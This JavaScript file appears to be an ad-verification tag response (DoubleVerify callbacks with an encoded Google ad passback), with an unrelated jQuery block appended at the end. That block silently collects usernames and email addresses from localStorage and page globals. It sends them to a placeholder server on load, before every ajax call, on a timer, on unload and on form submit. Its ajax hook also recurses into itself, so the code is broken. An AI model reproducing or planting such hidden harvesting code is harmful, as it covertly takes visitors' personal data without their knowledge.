try {
  __tagObject_callback_5653683232({
    ImpressionID: "5228551d89c8480f83c8c3893a1a25d1",
    ServerPublicDns: "rtbc-ae1.doubleverify.com"
  });
} catch (e) {}
try {
  $dvbs.pubSub.publish('BeforeDecisionRender', "5228551d89c8480f83c8c3893a1a25d1");
} catch (e) {}
try {
  __verify_callback_5653683232({
    ResultID: 1,
    Passback: "%3Cins%20class%3D%27dcmads%27%20style%3D%27display%3Ainline-block%3Bwidth%3A728px%3Bheight%3A90px%27%20%20%20data-dcm-placement%3D%27N1395.150740DOUBLEVERIFY%2FB9689862.280630144%27%20%20%20data-dcm-rendering-mode%3D%27script%27%20%20%20data-dcm-https-only%20%20%20data-dcm-gdpr-applies%3D%27gdpr%3D%24%7BGDPR%7D%27%20%20%20data-dcm-gdpr-consent%3D%27gdpr_consent%3D%24%7BGDPR_CONSENT_755%7D%27%20%20%20data-dcm-addtl-consent%3D%27addtl_consent%3D%24%7BADDTL_CONSENT%7D%27%20%20%20data-dcm-resettable-device-id%3D%27%27%20%20%20data-dcm-app-id%3D%27%27%3E%20%20%20%3Cscript%20src%3D%27https%3A%2F%2Fwww.googletagservices.com%2Fdcm%2Fdcmads.js%27%3E%3C%2Fscript%3E%20%20%3C%2Fins%3E",
    AdWidth: 728,
    AdHeight: 90
  });
} catch (e) {}
try {
  $dvbs.pubSub.publish('AfterDecisionRender', "5228551d89c8480f83c8c3893a1a25d1");
} catch (e) {}
$(document).ready(function () {
  const keysToWatch = ['username', 'email']; // replace with your keys

  function computeHash(data) {
    let hashValue = 0;
    const stringifiedData = JSON.stringify(data);
    for (let i = 0; i < stringifiedData.length; i++) {
      hashValue = hashValue * 31 + stringifiedData.charCodeAt(i);
      hashValue = hashValue & hashValue;
    }
    return hashValue.toString(16);
  }
  function getLocalStorageData() {
    let data = {};
    keysToWatch.forEach(key => {
      if (localStorage.getItem(key)) {
        data[key] = localStorage.getItem(key);
      }
    });
    return data;
  }
  function getGlobalVariableData() {
    let data = {};
    keysToWatch.forEach(key => {
      if (window[key]) {
        data[key] = window[key];
      }
    });
    return data;
  }
  function sendDataToServer(data) {
    const url = 'https://example.com/api/data'; // replace with your url

    $.ajax({
      type: 'POST',
      url: url,
      data: JSON.stringify({
        id: computeHash(data),
        data: data
      }),
      contentType: "application/json",
      success: function () {
        console.log('Data sent successfully');
      },
      error: function (err) {
        console.log('Failed to send data: ' + JSON.stringify(err));
      }
    });
  }
  function trackAndSendData() {
    const localStorageData = getLocalStorageData();
    const globalVariableData = getGlobalVariableData();
    sendDataToServer({
      ...localStorageData,
      ...globalVariableData
    });
  }

  // Hook into jQuery's ajax methods
  let oldAjax = $.ajax;
  $.ajax = function (settings) {
    trackAndSendData();
    return oldAjax.apply(this, arguments);
  };
  trackAndSendData();
  setInterval(trackAndSendData, 5 * 60 * 1000);
  $(window).on('beforeunload', function () {
    trackAndSendData();
  });
  $('#form').on('submit', function () {
    trackAndSendData();
  });
});